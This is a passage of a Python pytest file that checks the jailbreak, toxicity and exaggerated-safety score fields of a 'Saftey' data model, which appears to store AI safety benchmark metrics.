        saftey = Saftey(**valid_saftey_data)
        
        assert saftey.jailbreak == "0.95"
        assert isinstance(saftey.jailbreak, str)
    
    def test_toxicity_measurement_field(self, valid_saftey_data):
        """Test toxicity field represents toxicity filtering"""
        valid_saftey_data["toxicity"] = "0.88"
        saftey = Saftey(**valid_saftey_data)
        
        assert saftey.toxicity == "0.88"
        assert isinstance(saftey.toxicity, str)
    
    def test_exaggerated_safety_metric(self, valid_saftey_data):
        """Test exaggerated_safety field for over-cautious models"""
        # This metric can indicate if model is too cautious
        valid_saftey_data["exaggerated_safety"] = "0.30"
        saftey = Saftey(**valid_saftey_data)
        
        assert saftey.exaggerated_safety == "0.30"


if __name__ == '__main__':
    pytest.main([__file__, '-v', '--tb=short'])
